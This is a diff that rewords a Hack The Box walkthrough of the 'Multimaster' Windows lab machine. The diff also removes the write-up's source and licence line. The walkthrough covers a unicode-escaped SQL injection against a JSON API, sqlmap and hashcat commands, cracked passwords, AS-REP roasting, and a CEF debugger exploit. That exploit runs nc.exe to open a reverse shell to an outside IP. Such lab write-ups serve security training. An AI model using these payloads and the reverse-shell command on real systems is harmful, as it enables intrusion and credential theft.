@@ -6,20 +6,16 @@ points: 50
 rating: 4.3
 date: 2020-03-07
 avatar: assets/htb/multimaster.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Multimaster
 ---
-## Overview
-
-Hold on to your seats, because this Insane Windows machine is a wild ride. TODO:Finish this writeup, there are more notes and stuff in the notes app if anything is missing...
 
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
+I kicked things off with an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-` to cover every port, `-sC` (the same as `--script=default`) to fire the default enumeration scripts at the host, `-sV` for service/version detection, and `-oN <name>` to write the results to `<name>`.
 
-At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
+The scan initially failed until I appended `-Pn`, which suppresses nmap's ICMP host-discovery probes. From there it ran fine.
 
 ```text
 kac0@kalimaa:~/htb/multimaster$ nmap -p- -sC -sV -oN multimaster.nmap <YOUR_IP> -Pn
@@ -105,7 +101,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 486.11 seconds
 ```
 
-lots of ports open
+plenty of open ports here
 
 ```text
 rpcclient $> lsaquery
@@ -113,7 +109,7 @@ Domain Name: MEGACORP
 Domain Sid: S-1-5-21-3167813660-1240564177-918740779
 ```
 
-Capturing the burp request to the `/api/get/Colleagues`
+Grabbing the Burp request sent to `/api/get/Colleagues`
 
 ```text
 POST /api/getColleagues HTTP/1.1
@@ -131,7 +127,7 @@ DNT: 1
 {"name":"\u0061\u0027\u0020\u006F\u0072\u0020\u0031\u003D\u0031\u003B\u0020\u002D\u002D"}
 ```
 
-This is the unicode escaped equivilent of `a' or 1=1; --` And the response:
+That payload is the unicode-escaped form of `a' or 1=1; --` And the response:
 
 ```text
 HTTP/1.1 200 OK
@@ -149,7 +145,7 @@ Content-Length: 1821
 [{"id":1,"name":"Sarina Bauer","position":"Junior Developer","email":"sbauer@megacorp.htb","src":"sbauer.jpg"},{"id":2,"name":"Octavia Kent","position":"Senior Consultant","email":"okent@megacorp.htb","src":"okent.jpg"},{"id":3,"name":"Christian Kane","position":"Assistant Manager","email":"ckane@megacorp.htb","src":"ckane.jpg"},{"id":4,"name":"Kimberly Page","position":"Financial Analyst","email":"kpage@megacorp.htb","src":"kpage.jpg"},{"id":5,"name":"Shayna Stafford","position":"HR Manager","email":"shayna@megacorp.htb","src":"shayna.jpg"},{"id":6,"name":"James Houston","position":"QA Lead","email":"james@megacorp.htb","src":"james.jpg"},{"id":7,"name":"Connor York","position":"Web Developer","email":"cyork@megacorp.htb","src":"cyork.jpg"},{"id":8,"name":"Reya Martin","position":"Tech Support","email":"rmartin@megacorp.htb","src":"rmartin.jpg"},{"id":9,"name":"Zac Curtis","position":"Junior Analyst","email":"zac@magacorp.htb","src":"zac.jpg"},{"id":10,"name":"Jorden Mclean","position":"Full-Stack Developer","email":"jorden@megacorp.htb","src":"jorden.jpg"},{"id":11,"name":"Alyx Walters","position":"Automation Engineer","email":"alyx@megacorp.htb","src":"alyx.jpg"},{"id":12,"name":"Ian Lee","position":"Internal Auditor","email":"ilee@megacorp.htb","src":"ilee.jpg"},{"id":13,"name":"Nikola Bourne","position":"Head of Accounts","email":"nbourne@megacorp.htb","src":"nbourne.jpg"},{"id":14,"name":"Zachery Powers","position":"Credit Analyst","email":"zpowers@megacorp.htb","src":"zpowers.jpg"},{"id":15,"name":"Alessandro Dominguez","position":"Senior Web Developer","email":"aldom@megacorp.htb","src":"aldom.jpg"},{"id":16,"name":"MinatoTW","position":"CEO","email":"minato@megacorp.htb","src":"minato.jpg"},{"id":17,"name":"egre55","position":"CEO","email":"egre55@megacorp.htb","src":"egre55.jpg"}]
 ```
 
-next attempted to enumerate the valid users who have active accounts on this machine through Kerberos.
+Next I tried to enumerate which of these users actually have live accounts on the box by going through Kerberos.
 
 ```text
 kac0@kalimaa:~/htb/multimaster$ python3 /home/kac0/impacket/examples/GetNPUsers.py -outputfile multimaster.hash -format hashcat -usersfile /home/kac0/htb/multimaster/users -no-pass -dc-ip <YOUR_IP> MEGACORP/egre55
@@ -174,9 +170,9 @@ Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 ```
 
-used [wafw00f](https://github.com/enablesecurity/wafw00f) to detect if there was a WAF, but none was detected [https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/](https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/) [https://github.com/0xInfection/Awesome-WAF\#testing-methodology](https://github.com/0xInfection/Awesome-WAF#testing-methodology) [https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py)
+ran [wafw00f](https://github.com/enablesecurity/wafw00f) to check for a WAF, but it came back with nothing [https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/](https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/) [https://github.com/0xInfection/Awesome-WAF\#testing-methodology](https://github.com/0xInfection/Awesome-WAF#testing-methodology) [https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py)
 
-mine [https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body](https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body) [https://www.yg.ht/blog/blog/archives/361/getting-sqlmap-to-detect-injection-points-through-json](https://www.yg.ht/blog/blog/archives/361/getting-sqlmap-to-detect-injection-points-through-json) sqlmap -r burppost —tamper charunicodetamper.py —dbs -delay 5 sqlmap -r burppost —tamper charunicodetamper.py —D Hub\_DB -tables -delay 5 sqlmap will automatically detect that there is JSON data in your POST and will ask if you would like for it to process it. sqlmap called hash sha384\_generic\_passwd [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/) verified that the hash was sha2-384 There were duplicates of each hash, only four unique;
+mine [https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body](https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body) [https://www.yg.ht/blog/blog/archives/361/getting-sqlmap-to-detect-injection-points-through-json](https://www.yg.ht/blog/blog/archives/361/getting-sqlmap-to-detect-injection-points-through-json) sqlmap -r burppost —tamper charunicodetamper.py —dbs -delay 5 sqlmap -r burppost —tamper charunicodetamper.py —D Hub\_DB -tables -delay 5 sqlmap notices the JSON body in the POST on its own and prompts whether it should handle it. sqlmap identified the hash as sha384\_generic\_passwd [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/) confirmed the hash was sha2-384 Each hash appeared more than once, leaving only four unique values;
 
 hashcat -m 10800 -a 0 -o hash.cracked hash /usr/share/wordlists/rockyou.txt Possible algorithms: Keccak-384
 
@@ -204,7 +200,7 @@ Started: Mon Jul 20 19:17:26 2020
 Stopped: Mon Jul 20 19:17:57 2020
 ```
 
-Hashcat was able to crack 3 out of 4 of the hashes
+Hashcat managed to recover 3 of the 4 hashes
 
 ```text
 kac0@kalimaa:~/htb/multimaster$ cat hash.cracked 
@@ -213,9 +209,9 @@ kac0@kalimaa:~/htb/multimaster$ cat hash.cracked
 fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
 ```
 
-Just because the usernames I got were in the database does not mean they can login to this machine. Maybe need to enumerate users from the the domain in another way since ldap and rpc were not helpful [https://kalilinuxtutorials.com/mssql-injection](https://kalilinuxtutorials.com/mssql-injection) [https://github.com/Keramas/mssqli-duet](https://github.com/Keramas/mssqli-duet) [https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)
+Finding these usernames in the database doesn't guarantee any of them can actually log into the box. Since ldap and rpc didn't pan out, I probably need a different way to pull domain users [https://kalilinuxtutorials.com/mssql-injection](https://kalilinuxtutorials.com/mssql-injection) [https://github.com/Keramas/mssqli-duet](https://github.com/Keramas/mssqli-duet) [https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)
 
-[https://www.sqlservercentral.com/forums/topic/how-to-retrieve-active-directory-user-information-through-sql-server\`](https://www.sqlservercentral.com/forums/topic/how-to-retrieve-active-directory-user-information-through-sql-server`)' -- exec xp\_cmdshell 'net group /domain'\` returns same list as earlier user enumeration
+[https://www.sqlservercentral.com/forums/topic/how-to-retrieve-active-directory-user-information-through-sql-server\`](https://www.sqlservercentral.com/forums/topic/how-to-retrieve-active-directory-user-information-through-sql-server`)' -- exec xp\_cmdshell 'net group /domain'\` gives back the same list as my earlier user enumeration
 
 ```text
 USERS list
@@ -239,7 +235,7 @@ ilee
 nPourne
 ```
 
-from enum4linux
+output from enum4linux
 
 ```text
  =========================================== 
@@ -398,7 +394,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-User folders on this box include:
+The user directories present on this box are:
 
 ```text
 *Evil-WinRM* PS C:\Users> ls
@@ -564,7 +560,7 @@ text
 
 ### Moving to user2
 
-each site leads to next : [https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-1414](https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-1414) [https://github.com/qazbnm456/awesome-cve-poc](https://github.com/qazbnm456/awesome-cve-poc) [https://github.com/nu11secur1ty/Exp101tsArchiv30thers](https://github.com/nu11secur1ty/Exp101tsArchiv30thers) [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
+one link kept pointing to the next : [https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-1414](https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-1414) [https://github.com/qazbnm456/awesome-cve-poc](https://github.com/qazbnm456/awesome-cve-poc) [https://github.com/nu11secur1ty/Exp101tsArchiv30thers](https://github.com/nu11secur1ty/Exp101tsArchiv30thers) [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
 
 > Exploitation There are two main limitations to the exploitability, that are: 1. the debug port binds to 127.0.0.1 2. a random TCP port is used every execution
 >
@@ -615,7 +611,7 @@ c.exe : [2020/07/24 07:42:30:1971] U: There are 3 tcp sockets in state listen.
 [2020/07/24 07:42:50:2430] U: ws://127.0.0.1:7437/68e9868e-29b8-48fc-9612-8be4aea95ccd
 ```
 
-had to keep starting over again as the CEF debug server kept changing
+I had to restart repeatedly because the CEF debug server's port kept rotating
 
 ```text
 *Evil-WinRM* PS C:\Users\alcibiades> C:\Users\alcibiades\c.exe --url ws://127.0.0.1:7437/68e9868e-29b8-48fc-9612-8be4aea95ccd --code "process.mainModule.require('child_process').exec('cmd.exe /c C:\Users\alcibiades\nc.exe 10.10.15.57 4445 -e cmd.exe')"
@@ -677,7 +673,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-while searching around I cound that I had access to a folder I didn't before...the `wwwroot\` folder in `C:\inetpub\`
+poking around, I noticed I now had access to a folder that was off-limits before...the `wwwroot\` folder under `C:\inetpub\`
 
 ```text
 *Evil-WinRM* PS C:\inetpub\wwwroot> more index.html
@@ -688,7 +684,7 @@ while searching around I cound that I had access to a folder I didn't before...t
 
 [https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell](https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell) `ls -R|?{$_|Select-String 'dummy'}|%{$_.FullName;gc $_}`
 
-Running the command `*Evil-WinRM* PS C:\inetpub\wwwroot\bin> type MultimasterAPI.dll` results in:
+Running `*Evil-WinRM* PS C:\inetpub\wwwroot\bin> type MultimasterAPI.dll` produces:
 
 ```text
 IndexDefaultApi+api/{controller}/{id}%/api/getColleagues
@@ -721,7 +717,7 @@ SMB         <YOUR_IP>    445    MULTIMASTER      [-] MEGACORP\sbauer:banking1 ST
 SMB         <YOUR_IP>    445    MULTIMASTER      [+] MEGACORP\sbauer:D3veL0pM3nT!
 ```
 
-I found a password for yet again another user: this time `sbauer`. Accordeing to my searches with Bloodhoud earlier, `jorden` should be next, then `Administrator`. we will see if my projected path from this user was correct.
+That turned up a password for yet another user, this time `sbauer`. Based on the Bloodhound work I'd done earlier, `jorden` should follow next, and then `Administrator`. Let's see whether the path I plotted from this account holds up.
 
 > GenericWrite Generic Write access grants you the ability to **write to any non-protected attribute on the target object**, including “members” for a group, and “**serviceprincipalnames**” for a user Abuse Info Users With GenericWrite over a user, **perform a targeted kerberoasting attack**. See the abuse section under the GenericAll edge for more information
 
@@ -740,7 +736,7 @@ Set-ADAccountControl -DoesNotRequirePreAuth
 > * $False or 0
 > * $True or 1
 
-Then we can use Impacket's GETSPNUSers.py
+Then Impacket's GETSPNUSers.py can be used
 
 ```text
 kac0@kalimaa:~/htb/multimaster$ evil-winrm -u sbauer -i <YOUR_IP> -p D3veL0pM3nT!
@@ -862,7 +858,7 @@ $krb5asrep$23$jorden@MEGACORP:1056ca13b19833bd5ae1152f9fe42b5c$112eb867bb4c8c065
 [-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-the password cracked very quickly
+the hash cracked almost instantly
 
 ```text
 kac0@kalimaa:~/htb/multimaster$ hashcat -m 18200 -a 0 jorden.hash ~/rockyou.txt
@@ -896,7 +892,7 @@ Started: Fri Jul 24 20:36:14 2020
 Stopped: Fri Jul 24 20:36:44 2020
 ```
 
-the user `jorden`'s password was `rainforest786`
+so `jorden`'s password turned out to be `rainforest786`
 
 ```text
 *Evil-WinRM* PS C:\Users\jorden\Documents> whoami /all
@@ -948,7 +944,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-This user has backup and restore privileges, which if I remember correctly is a quick and easy path to escalate privileges "This privilege causes the system to grant all read access control to any file \(only read\)."
+This account holds backup and restore privileges, which as I recall is a fast and simple route to privilege escalation "This privilege causes the system to grant all read access control to any file \(only read\)."
 
 [https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea\_Pierini-Whoami\_Priv\_Show\_Me\_Your\_Privileges\_And\_I\_Will\_Lead\_You\_To\_System.pdf](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)
 
@@ -991,7 +987,7 @@ At line:1 char:12
     + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectCommand
 ```
 
-Make sure not to have any spaces between words in your command!
+Be careful not to leave any spaces between the words in the command!
 
 ### Root.txt
 
